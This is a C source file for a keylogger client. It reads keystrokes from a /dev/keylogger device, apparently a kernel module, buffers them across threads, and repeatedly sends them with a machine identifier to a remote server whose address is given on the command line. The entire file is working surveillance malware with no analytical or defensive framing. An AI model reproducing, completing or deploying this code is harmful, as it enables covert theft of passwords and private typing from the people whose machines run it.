#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include "server_communication.h"

#define SMALL_BUFFER_SIZE 32
#define BIG_BUFFER_SIZE 128

char smallBuffer[SMALL_BUFFER_SIZE];
int smallBufferSize = 0;

char toSendBuffer[BIG_BUFFER_SIZE];
int toSendBufferSize = 0;

int machineId = -1;

pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;

pthread_t connectionThread;

struct sockaddr_in addr;

int interval = 5;


void* connectionThreadWorker(void* nothing)
{
    int connectionfd = -1;
    while (1)
    {
        pthread_mutex_lock(&mutex);
        // wait until big buffer is empty
        if (toSendBufferSize == 0)
        {
            printf("Big buffer empty, nothing to send - hanging...\n");
            pthread_cond_wait(&cond, &mutex);
        }
        pthread_mutex_unlock(&mutex);

        connectionfd = socket(AF_INET, SOCK_STREAM, 0);
        // try to connect
        while (connect(connectionfd, (const struct sockaddr *) &addr, sizeof(addr)) == -1)
        {
            fprintf(stderr, "Can't connect, retrying in %u seconds...\n", interval);
            sleep(interval);
        }

        int status = -1;
        pthread_mutex_lock(&mutex);

        // send data
        status = sendDataToServer(connectionfd, toSendBuffer, toSendBufferSize, (uint32_t *) &machineId);
        // set size to 0
        if (status == 0)
        {
            toSendBufferSize = 0;
            pthread_cond_signal(&cond);
        }

        pthread_mutex_unlock(&mutex);
        close(connectionfd);
    }
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        fprintf(stderr, "Incorrect number of arguments\n");
        return 1;
    }

    // read address and port
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    inet_pton(AF_INET, argv[1], &addr.sin_addr);
    addr.sin_port = (in_port_t) htons((uint16_t) atoi(argv[2]));

    // read computer id TODO
    FILE *f = fopen("/boot/.id", "r");
    if (f!=NULL) {
        fscanf(f, "%d", &machineId);
        fclose(f);
    }

    // open device
    int dev_fd = -1;
    if ((dev_fd = open("/dev/keylogger", O_RDONLY)) == -1)
    {
        fprintf(stderr, "Cannot open device\n");
        return 2;
    }

    // create connectionThread
    if (pthread_create(&connectionThread, NULL, &connectionThreadWorker, NULL) != 0)
    {
        fprintf(stderr, "Cannot create thread\n");
        return 3;
    }

    int totalRead = 0;
    while (1)
    {
        int readBytes;
        if ((readBytes = read(dev_fd, smallBuffer + smallBufferSize, SMALL_BUFFER_SIZE - smallBufferSize)) == -1)
        {
            fprintf(stderr, "Error reading device\n");
            close(dev_fd);
            exit(3);
        }
        smallBufferSize += readBytes;

        totalRead += readBytes;
        printf("Read %d bytes, total: %d, current size: %d big: %d\n", readBytes, totalRead, smallBufferSize, toSendBufferSize);

        if (smallBufferSize == SMALL_BUFFER_SIZE)
        {
            pthread_mutex_lock(&mutex);

            // wait until big buffer have space for full small buffer
            if (BIG_BUFFER_SIZE - toSendBufferSize < SMALL_BUFFER_SIZE)
            {
                printf("Not enouch space in big buffer - hanging...\n");
                pthread_cond_wait(&cond, &mutex);
            }

            // copy to big buffer
            memcpy(toSendBuffer + toSendBufferSize, smallBuffer, SMALL_BUFFER_SIZE);
            toSendBufferSize += SMALL_BUFFER_SIZE;
            smallBufferSize = 0;

            // notify, that big buffer is not empty
            pthread_cond_signal(&cond);

            pthread_mutex_unlock(&mutex);
        }
    }
}
